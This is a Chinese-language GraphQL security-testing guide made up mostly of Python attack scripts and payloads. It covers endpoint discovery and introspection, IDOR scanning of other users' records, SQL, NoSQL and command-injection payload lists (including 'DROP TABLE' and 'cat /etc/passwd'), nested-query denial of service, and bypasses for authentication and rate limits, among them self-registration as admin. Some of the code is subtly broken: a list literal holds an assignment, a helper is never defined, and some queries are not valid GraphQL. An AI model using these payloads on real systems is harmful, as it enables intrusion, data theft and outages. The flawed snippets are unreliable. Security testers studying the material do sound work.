# GraphQL 安全测试指导

## 目录

1. [GraphQL 特征识别](#1-graphql-特征识别)
2. [端点发现](#2-端点发现)
3. [内省查询](#3-内省查询)
4. [查询构造](#4-查询构造)
5. [授权测试](#5-授权测试)
6. [注入测试](#6-注入测试)
7. [拒绝服务](#7-拒绝服务)
8. [Bypass 技巧](#8-bypass-技巧)

---

## 1. GraphQL 特征识别

### 识别特征

| 特征 | 说明 |
|------|------|
| URL | `/graphql`, `/api`, `/query` |
| Content-Type | `application/json` |
| 请求方法 | POST (主要), GET (查询) |
| 请求体 | `{"query": "...", "variables": {...}}` |
| 响应 | `{"data": {...}, "errors": [...]}` |

### 常见 GraphQL 路径

```
/graphql
/graphql/console
/api/graphql
/api/v1/graphql
/graphql-api
/query
```

### 技术识别

```python
# GraphQL 识别方法
def detect_graphql(url):
    # 1. 检查 GraphQL 特有响应
    resp = requests.post(url, json={"query": "{__typename}"})
    if "data" in resp.json() and "__typename" in resp.text:
        return True
    
    # 2. 检查 introspection 端点
    resp = requests.post(url, json={
        "query": "{__schema{queryType{name}}}"
    })
    if "data" in resp.json():
        return True
    
    # 3. 检查 GraphQL 特有错误
    if "errors" in resp.json() and any(
        e.get("message", "").startswith("Cannot query")
        for e in resp.json().get("errors", [])
    ):
        return True
    
    return False
```

---

## 2. 端点发现

### 2.1 常见路径探测

```python
# GraphQL 端点字典
GRAPHQL_PATHS = [
    "/graphql",
    "/graphql/console",
    "/api/graphql",
    "/api/v1/graphql",
    "/api/v2/graphql",
    "/graphql-api",
    "/query",
    "/graphql.php",
    "/graphqly",
    "/api/query",
]

# 探测函数
def probe_graphql_endpoint(base_url):
    for path in GRAPHQL_PATHS:
        url = base_url + path
        try:
            resp = requests.post(url, json={"query": "{__typename}"}, timeout=5)
            if resp.status_code == 400 and "data" in resp.text:
                print(f"[+] Found GraphQL: {url}")
                return url
        except:
            pass
    return None
```

### 2.2 从 JS 中发现

```python
# 从 JS 源码中提取 GraphQL 配置
GRAPHQL_PATTERNS = [
    r'["\']/(?:graphql|api/graphql)["\']',
    r'endpoint\s*:\s*["\']([^"\']+)["\']',
    r'graphql\s*:\s*["\']([^"\']+)["\']',
    r'new\s+GraphQLClient\(["\']([^"\']+)["\']',
]

def extract_from_js(js_content):
    endpoints = []
    for pattern in GRAPHQL_PATTERNS:
        matches = re.findall(pattern, js_content)
        endpoints.extend(matches)
    return list(set(endpoints))
```

---

## 3. 内省查询

### 3.1 完整内省查询

```python
# 获取完整 schema
INTROSPECTION_QUERY = """
{
  __schema {
    queryType { name }
    mutationType { name }
    subscriptionType { name }
    types {
      kind
      name
      fields(includeDeprecated: true) {
        name
        args {
          name
          type { name kind ofType { name kind } }
          defaultValue
        }
        type { name kind ofType { name kind } }
        isDeprecated
        deprecationReason
      }
    }
  }
}
"""

# 执行内省
def introspect(url, headers=None):
    resp = requests.post(
        url,
        json={"query": INTROSPECTION_QUERY},
        headers=headers
    )
    return resp.json()
```

### 3.2 分字段内省

```python
# 获取所有 Query 字段
QUERY_FIELDS = """
{
  __schema {
    queryType {
      fields {
        name
        description
        args { name type { name } }
        type { name }
      }
    }
  }
}
"""

# 获取所有 Mutation 字段
MUTATION_FIELDS = """
{
  __schema {
    mutationType {
      fields {
        name
        description
        args { name type { name } }
        type { name }
      }
    }
  }
}
"""

# 获取特定类型详情
TYPE_DETAIL = """
{
  __type(name: "User") {
    name
    fields {
      name
      type { name }
    }
  }
}
"""
```

### 3.3 枚举值获取

```python
# 获取枚举值
ENUM_VALUES = """
{
  __type(name: "UserRole") {
    enumValues {
      name
      description
    }
  }
}
"""

# 获取输入类型
INPUT_TYPES = """
{
  __schema {
    inputTypes {
      name
      inputFields {
        name
        type { name }
      }
    }
  }
}
"""
```

---

## 4. 查询构造

### 4.1 基本查询

```python
# 简单查询
QUERY_1 = """
{
  user(id: "1") {
    id
    username
    email
  }
}
"""

# 带参数查询
QUERY_2 = """
{
  users(filter: {role: "admin"}, limit: 10) {
    id
    username
    profile {
      name
      avatar
    }
  }
}
"""

# 嵌套查询
QUERY_3 = """
{
  orders(first: 5) {
    edges {
      node {
        id
        total
        user {
          username
          email
        }
        items {
          product { name }
          quantity
        }
      }
    }
  }
}
"""
```

### 4.2 Mutation

```python
# 登录 Mutation
LOGIN_MUTATION = """
mutation {
  login(username: "admin", password: "admin123") {
    token
    user {
      id
      username
    }
  }
}
"""

# 创建资源
CREATE_MUTATION = """
mutation {
  createPost(input: {
    title: "Test"
    content: "Test content"
    authorId: "1"
  }) {
    id
    title
  }
}
"""

# 更新资源
UPDATE_MUTATION = """
mutation {
  updateUser(id: "1", input: {
    email: "hacked@example.com"
  }) {
    id
    email
  }
}
"""

# 删除资源
DELETE_MUTATION = """
mutation {
  deleteUser(id: "1") {
    success
  }
}
"""
```

---

## 5. 授权测试

### 5.1 未授权访问

```python
# 不带 Token 测试
def test_unauthorized(url):
    queries = [
        "{ users { id username email } }",
        "{ orders { id total } }",
        "{ admin { panel } }",
    ]
    
    for query in queries:
        resp = requests.post(url, json={"query": query})
        if "data" in resp.json() and resp.json()["data"] is not None:
            print(f"[!] 未授权访问: {query}")
```

### 5.2 字段级授权

```python
# 测试字段级权限（Admin 字段普通用户可见）
def test_field_auth(url, user_token):
    # 用户自己的查询
    user_query = """
    {
      user(id: "1") {
        id
        username
        email
        isAdmin  # 应该需要 admin 权限
      }
    }
    """
    
    headers = {"Authorization": f"Bearer {user_token}"}
    resp = requests.post(url, json={"query": user_query}, headers=headers)
    
    if "isAdmin" in str(resp.json()):
        print("[!] 字段级权限绕过 - 普通用户可见 admin 字段")
```

### 5.3 IDOR 测试

```python
# GraphQL IDOR 测试
def test_graphql_idor(url, token):
    headers = {"Authorization": f"Bearer {token}"}
    
    # 用自己的 token 访问自己的数据（基线）
    baseline = requests.post(url, json={
        "query": "{ user(id: \"1\") { id username } }"
    }, headers=headers)
    
    # 尝试访问其他用户的数据
    for victim_id in ["2", "3", "4", "5"]:
        resp = requests.post(url, json={
            "query": f'{{ user(id: "{victim_id}") {{ id username email }} }}'
        }, headers=headers)
        
        data = resp.json().get("data")
        if data and data.get("user"):
            print(f"[!] IDOR - 可访问用户 {victim_id} 的数据")
```

---

## 6. 注入测试

### 6.1 SQL 注入 (在 Query 变量中)

```python
# SQL 注入测试
SQLI_PAYLOADS = [
    '" OR "1"="1',
    "' OR '1'='1",
    "1; DROP TABLE users--",
    "1' UNION SELECT NULL--",
]

def test_sqli_injection(url, token):
    headers = {"Authorization": f"Bearer {token}"}
    
    for payload in SQLI_PAYLOADS:
        resp = requests.post(url, json={
            "query": f'{{ user(id: "{payload}") {{ id username }} }}',
            "variables": {"id": payload}
        }, headers=headers)
        
        if "error" not in resp.text and "sql" in resp.text.lower():
            print(f"[!] SQL 注入: {payload}")
```

### 6.2 NoSQL 注入

```python
# NoSQL 注入测试 (MongoDB)
NOSQL_PAYLOADS = [
    '{"$ne": null}',
    '{"$gt": ""}',
    '{"$regex": ".*"}',
    '{"$where": "1==1"}',
]

def test_nosql_injection(url, token):
    headers = {"Authorization": f"Bearer {token}"}
    
    for payload in NOSQL_PAYLOADS:
        resp = requests.post(url, json={
            "query": f'{{ users(filter: {{username: {payload}}}) {{ id }} }}'
        }, headers=headers)
        
        if resp.status_code == 200:
            print(f"[?] NoSQL 注入候选: {payload}")
```

### 6.3 命令注入

```python
# 如果 GraphQL 支持文件操作或系统命令
CMD_PAYLOADS = [
    "; ls",
    "| cat /etc/passwd",
    "`whoami`",
    "$(id)",
]

def test_cmd_injection(url, token):
    headers = {"Authorization": f"Bearer {token}"}
    
    # 查找支持文件操作的字段
    # filePath, command, shell 等
    fields = ["filePath", "command", "shell", "script"]
    
    for field in fields:
        query = f"""
        {{
          system(input: {{ {field}: "; ls" }}) {{
            output
          }}
        }}
        """
        resp = requests.post(url, json={"query": query}, headers=headers)
        
        if resp.status_code == 200 and "root:" in resp.text:
            print(f"[!] 命令注入在字段: {field}")
```

---

## 7. 拒绝服务

### 7.1 深度嵌套查询

```python
# 深度嵌套导致 DoS
NESTED_QUERY = """
{
  user(id: "1") {
    friends {
      friends {
        friends {
          friends {
            id
            username
          }
        }
      }
    }
  }
}
"""

# 批量查询导致 DoS
BATCH_QUERY = """
{
  u1: user(id: "1") { id }
  u2: user(id: "2") { id }
  # ... 重复 100 次
  u100: user(id: "100") { id }
}
"""

def test_dos(url):
    # 测试嵌套深度
    for depth in [5, 10, 15, 20]:
        query = build_nested_query(depth)
        start = time.time()
        resp = requests.post(url, json={"query": query}, timeout=10)
        duration = time.time() - start
        
        if duration > 5:
            print(f"[!] DoS - 深度 {depth} 耗时 {duration}s")
```

### 7.2 资源密集型字段

```python
# 搜索/计算密集型字段
EXPENSIVE_FIELDS = [
    "search(query: *)",
    "compute(primes: 1000000)",
    "generateReport(year: 9999)",
    "exportAllData()",
]

def test_expensive_operations(url):
    for field in EXPENSIVE_FIELDS:
        query = f"{{ {field} }}"
        start = time.time()
        try:
            resp = requests.post(url, json={"query": query}, timeout=5)
            duration = time.time() - start
            if duration > 3:
                print(f"[!] 耗时操作: {field} ({duration}s)")
        except:
            pass
```

---

## 8. Bypass 技巧

### 8.1 绕过字段限制

```python
# 如果某字段被过滤，尝试别名
ALIAS_BYPASS = """
{
  user: users(limit: 1) { id }
  _user: users(limit: 1) { id username }
}
"""

# 绕过类型检查
TYPE_BYPASS = """
{
  # 如果 Int 期望 5，尝试 String "5"
  user(id: "5") { id }
}
"""

# 绕过 N+1 限制
N_PLUS_1_BYPASS = """
{
  # 多次执行同一查询
  u1: user(id: "1") { id }
  u2: user(id: "2") { id }
  # 避免字段限制
}
"""
```

### 8.2 绕过认证

```python
# 如果登录被限制，尝试
AUTH_BYPASS = [
    # 1. 直接访问需要认证的查询
    "{ admin { users { id } } }",
    
    # 2. 利用注册接口创建 admin
    MUTATION_CREATE_ADMIN = """
    mutation {
      register(input: {
        username: "admin2"
        password: "Admin123!"
        role: "admin"  # 尝试设置 admin 角色
      }) { token }
    }
    """,
    
    # 3. 利用忘记密码重置 admin
]
```

### 8.3 绕过速率限制

```python
# 如果有速率限制，尝试
RATE_LIMIT_BYPASS = [
    # 1. 使用不同字段名
    {"query": "{ u: user(id: \"1\") { id } }"},
    {"query": "{ user1: user(id: \"1\") { id } }"},
    
    # 2. 注释绕过
    {"query": "{ user(id: \"1\") { id } } # "},
    {"query": "{ user /* */ (id: \"1\") { id } }"},
    
    # 3. 变量混淆
    {"query": "query($id: ID!) { user(id: $id) { id } }",
     "variables": {"id": "1"}},
]
```

---

## 附录：GraphQL 测试检查清单

```
□ 发现阶段
  □ 识别 GraphQL 端点
  □ 从 JS 中发现 GraphQL 配置
  □ 获取完整 Schema (introspection)

□ 查询测试
  □ 列出所有类型和字段
  □ 获取枚举值
  □ 理解数据模型关系

□ 授权测试
  □ 未认证访问
  □ 字段级权限绕过
  □ IDOR (跨用户访问)
  □ 垂直越权

□ 注入测试
  □ SQL 注入
  □ NoSQL 注入
  □ 命令注入
  □ XSS

□ DoS 测试
  □ 深度嵌套查询
  □ 批量查询
  □ 资源密集型操作

□ 安全配置
  □ 限流测试
  □ CORS 配置
  □ 调试模式
```
